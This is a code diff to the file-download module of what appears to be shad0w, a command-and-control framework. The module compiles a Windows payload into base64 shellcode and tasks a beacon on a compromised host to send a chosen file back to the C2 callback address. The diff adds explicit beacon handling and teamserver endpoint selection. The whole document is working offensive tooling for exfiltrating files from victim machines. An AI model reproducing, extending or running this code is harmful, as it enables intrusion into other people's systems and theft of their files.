@@ -17,6 +17,9 @@ EXEC_ID = 0x3000
 ERROR = False
 error_list = ""
 
+# beacon to exec command on
+current_beacon = None
+
 # name of the file to download
 FILE_TO_DOWLOAD = ""
 
@@ -33,11 +36,9 @@ def exit(status=0, message=None):
 def download_callback(shad0w, data):
     global FILE_TO_DOWLOAD
 
-    shad0w.beacons[shad0w.current_beacon]["callback"] = None
-
     FILE_TO_DOWLOAD = ''.join(FILE_TO_DOWLOAD)
 
-    shad0w.debug.good(f"Downloading '{FILE_TO_DOWLOAD}' ({len(data)} bytes)")
+    shad0w.event.beacon_info(current_beacon, f"Downloading '{FILE_TO_DOWLOAD}' ({len(data)} bytes)\n")
 
     # change to the dir of the folder mapped to the users current dir
     os.chdir("/root/shad0w/.bridge")
@@ -50,18 +51,16 @@ def download_callback(shad0w, data):
     # change the dir to our root
     os.chdir("/root/shad0w/")
 
-    shad0w.debug.good(f"Downloaded")
+    shad0w.event.beacon_info(current_beacon, f"Downloaded")
 
     return ""
 
 
-def main(shad0w, args):
-    global FILE_TO_DOWLOAD
+def main(shad0w, args, beacon):
+    global FILE_TO_DOWLOAD, current_beacon
 
-    # check we actually have a beacon
-    if shad0w.current_beacon is None:
-        shad0w.debug.error("ERROR: No active beacon")
-        return
+    # make beacon global
+    current_beacon = beacon
 
     # usage examples
     usage_examples = """
@@ -88,10 +87,10 @@ download C:\\Users\\thejoker\\Desktop\\evil_plans.txt
         args = parse.parse_args(args[1:])
     except:
         pass
-    
+
     # we need a file to read so if we dont then fail
     if len(args.file) == 0:
-        print(error_list) 
+        print(error_list)
         parse.print_help()
         return
 
@@ -100,10 +99,10 @@ download C:\\Users\\thejoker\\Desktop\\evil_plans.txt
 
     # change to the dir of the folder mapped to the users current dir
     os.chdir("/root/shad0w/.bridge")
-    
-    # make this variable global so the call back can access it 
+
+    # make this variable global so the call back can access it
     FILE_TO_DOWLOAD = args.file
-    
+
     # change back to our dir
     os.chdir(shad0w_cwd)
 
@@ -112,6 +111,14 @@ download C:\\Users\\thejoker\\Desktop\\evil_plans.txt
 
     # clone all the source files
     buildtools.clone_source_files(rootdir="/root/shad0w/modules/windows/download/", builddir="/root/shad0w/modules/windows/download/build")
+
+    # get the correct callback details
+    if shad0w.teamserver:
+        endpoint = shad0w.teamsrv.c2_endpoint
+        port     = shad0w.teamsrv.c2_port
+    else:
+        endpoint = shad0w.endpoint
+        port     = shad0w.addr[1]
 
     # set the correct settings
     template = """#define _C2_CALLBACK_ADDRESS L"%s"
@@ -122,7 +129,7 @@ download C:\\Users\\thejoker\\Desktop\\evil_plans.txt
 #define _HEADER_LEN -1
 #define SESSION_ID "%s"
 #define DO_CALLBACK 0x4000
-#define FILENAME "%s" """ % (shad0w.endpoint, shad0w.addr[1], shad0w.current_beacon, read_file)
+#define FILENAME "%s" """ % (endpoint, port, current_beacon, read_file)
 
     buildtools.update_settings_file(None, custom_template=template, custom_path="/root/shad0w/modules/windows/download/build/settings.h")
 
@@ -133,5 +140,5 @@ download C:\\Users\\thejoker\\Desktop\\evil_plans.txt
     rcode = buildtools.extract_shellcode(beacon_file="/root/shad0w/modules/windows/download/module.exe", want_base64=True)
 
     # set a task for the current beacon to do
-    shad0w.beacons[shad0w.current_beacon]["callback"] = download_callback
-    shad0w.beacons[shad0w.current_beacon]["task"] = (EXEC_ID, rcode)
+    shad0w.beacons[current_beacon]["callback"] = download_callback
+    shad0w.beacons[current_beacon]["task"] = (EXEC_ID, rcode)
